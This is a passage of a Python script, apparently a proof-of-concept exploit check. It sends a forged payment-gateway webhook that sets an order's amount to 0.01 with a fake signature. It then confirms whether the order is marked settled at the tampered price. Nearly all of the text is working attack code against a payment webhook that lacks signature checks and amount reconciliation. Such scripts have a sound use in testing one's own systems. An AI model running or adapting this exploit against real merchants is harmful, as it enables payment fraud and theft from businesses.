def out(msg):
    print(msg)
    sys.exit(0)

try:
    order_id = 'order-1001'
    # Fetch original amount for evidence
    orig_amount = None
    try:
        r0 = requests.get(f'{base}/api/payments/order/{order_id}', timeout=3)
        if r0.status_code == 200:
            orig_amount = r0.json().get('Amount') or r0.json().get('amount')
    except Exception:
        pass

    tampered = 0.01
    payload = {'OrderId': order_id, 'Amount': tampered, 'Signature': 'forged'}
    r = requests.post(f'{base}/api/webhook/gateway', json=payload, timeout=3)
    if r.status_code != 200:
        out(f'EXPLOIT_FAIL: webhook returned status {r.status_code} body={r.text[:120]}')

    try:
        body = r.json()
    except Exception:
        out(f'EXPLOIT_FAIL: non-json response body={r.text[:120]}')

    settled_amount = body.get('amount', body.get('Amount'))
    status = body.get('status', body.get('Status'))

    # Confirm with authoritative GET
    confirm_amount = None
    confirm_status = None
    try:
        r2 = requests.get(f'{base}/api/payments/order/{order_id}', timeout=3)
        if r2.status_code == 200:
            jb = r2.json()
            confirm_amount = jb.get('amount', jb.get('Amount'))
            confirm_status = jb.get('status', jb.get('Status'))
    except Exception:
        pass

    if str(status).lower() == 'settled' and float(settled_amount) == tampered:
        out(f'EXPLOIT_SUCCESS: order {order_id} settled at tampered amount={settled_amount} (original={orig_amount}, confirm_status={confirm_status}, confirm_amount={confirm_amount}); no server-side reconciliation')
    else:
        out(f'EXPLOIT_FAIL: unexpected response status={status} amount={settled_amount}')
except requests.RequestException as e:
    out(f'EXPLOIT_FAIL: request error {e.__class__.__name__}: {str(e)[:120]}')
except Exception as e:
    out(f'EXPLOIT_FAIL: {e.__class__.__name__}: {str(e)[:120]}')

